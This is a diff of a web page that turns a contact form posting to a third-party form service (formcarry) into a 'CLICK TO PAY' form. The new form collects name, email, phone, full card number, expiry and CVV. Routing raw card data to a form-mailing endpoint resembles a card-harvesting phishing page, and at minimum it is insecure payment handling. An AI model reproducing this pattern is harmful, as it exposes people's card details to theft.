@@ -23,17 +23,42 @@ action="https://formcarry.com/s/h5boWH8R3UJ"
 method="POST"
 enctype="multipart/form-data"
 >
-<label>
-  Your email:
-  <!-- name each of your inputs as you wish -->
-  <input type="email" name="email">
-</label>
-<label>
-  Your message:
-  <textarea name="message"></textarea>
-</label>
+<!-- User Details -->
+<h3>User Details</h3>
+<div class="form-group">
+    <label class="label" for="name">Name:</label>
+    <input type="text" id="name" class="input-field" name="name" placeholder="olwethu" required>
+</div>
+<div class="form-group">
+    <label class="label" for="email">Email:</label>
+    <input type="email" id="email" class="input-field" name="email" placeholder="olwethumkhwanazi@duck.com" required>
+</div>
+<div class="form-group">
+    <label class="label" for="phone">Phone:</label>
+    <input type="tel" id="phone" class="input-field" name="phone" placeholder="071 234 567 890" required>
+</div>
+
+<!-- Banking Details -->
+<h3>Banking Details</h3>
+<div class="form-group">
+    <label class="label" for="card-number">Card Number:</label>
+    <input type="text" id="card-number" class="input-field" name="card" placeholder="0000 0000 0000 0000" required>
+</div>
+<div class="form-group">
+    <label class="label" for="card-name">Card Name:</label>
+    <input type="text" id="card-name" class="input-field" name="name" placeholder="Capitec" required>
+</div>
+<div class="form-group">
+    <label class="label" for="expiration-date">Expiration Date:</label>
+    <input type="date" id="expiration-date" class="input-field" name="expiration-date" placeholder="2024" required>
+</div>
+<div class="form-group">
+    <label class="label" for="cvv">CVV:</label>
+    <input type="password" id="cvv" class="input-field" name="CVV" placeholder="000" required><br></br>
+</div>
 <!-- your other form fields go here -->
-<button type="submit">Send</button>
+ 
+<button type="submit" id="payment"><img src="https://www.freeiconspng.com/uploads/payment-icon-credit-payment-icon-0.png" alt="Payment Icon Credit, payment icon" >CLICK TO PAY</button>
 </form>
 
     </main>
